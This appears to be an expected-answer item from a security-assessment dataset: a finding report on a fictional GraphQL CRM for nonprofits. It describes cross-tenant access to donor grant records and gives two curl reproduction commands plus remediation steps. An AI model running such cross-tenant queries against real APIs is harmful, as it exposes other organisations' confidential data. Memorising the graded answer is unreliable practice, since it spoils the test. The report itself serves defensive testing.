# Expected Response

## System
- Domain: Non-Profit / Fundraising CRM
- System: GrantFlow CRM API
- Example ID: GQL-0077

## Priority Findings

### Finding 1: CRM Metadata/Attribute Side-Channel — Cross-Tenant Donor Data Disclosure (Pattern 2.2)
**Severity:** High
**Category:** BAC / Metadata Side-Channel

**Summary:**
Per §5.0 (Pattern 2.2 — metadata/attribute side-channel): The `getResource` resolver returns metadata fields (`internalNotes`, `auditLog`) that reveal internal operational details when accessed cross-tenant. An attacker from `tenant-b473` accessed CRM grant record `R-2077` belonging to `tenant-a22b`. Beyond the direct BOLA, the `internalNotes` field returned constitutes a metadata side-channel exposing internal CRM annotations about donor relationships, grant decisions, and campaign strategies.

**Evidence from HAR:**
- Request: `POST https://api.grantflow-crm-api.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-b473`
- Query: `getResource(id: "R-2077") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-a22b"`, `ownerId: "other-user-b473a22b"`, `sensitiveField: "CONFIDENTIAL-b473a22b"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-b473a22b`

**Root Cause (§4.0 RISK-GQL-077):** `getResource` fetches by ID only; `internalNotes`/`auditLog` fields exposed to cross-tenant callers.

## Steps to Reproduce

### Step 1 — Cross-tenant CRM record access with metadata (HAR)
```bash
curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-b473" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2077\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-b473a22b` + `internalNotes: "Internal data exposed"` from `tenant-a22b`. **Secure:** FORBIDDEN.

### Step 2 — Metadata side-channel via auditLog field
```bash
curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-b473" \
  -d '{"query": "query { getResource(id: \"R-2077\") { data { auditLog { action timestamp } } } }"}'
```
**Vulnerable:** `auditLog` reveals internal operational timeline — pattern 2.2 side-channel.

## Remediation
1. Resolver tenant guard on `getResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `internalNotes` and `auditLog` from responses to non-admin callers.
3. Apply field-level authorization for sensitive metadata fields.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
